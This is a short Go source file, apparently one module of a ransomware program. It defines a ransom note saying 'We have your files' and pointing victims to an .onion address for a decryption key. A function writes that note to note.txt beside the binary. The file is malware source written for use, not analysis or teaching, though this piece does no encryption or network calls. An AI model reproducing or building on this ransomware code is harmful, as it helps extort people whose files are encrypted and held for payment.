package notes

import (
	"log"
	"os"
)

const (
	ransomNoteFile string = "note.txt"
	ransomNote     string = `Congratz! You've been promoted to customer!
We have your files.
Contact us at 4lsx65l3syeqs7db673piu34qgumevfhhq2grhkfitquytawogjbqeid.onion to get decryption key.
`
)

// Create your note here, leave it next to the binary.
func WriteANote() {
	err := os.WriteFile(ransomNoteFile, []byte(ransomNote), 0644)
	if err != nil {
		log.Printf("[-] The ransom note was unable to be written.\nError: %s", err)
	}
}
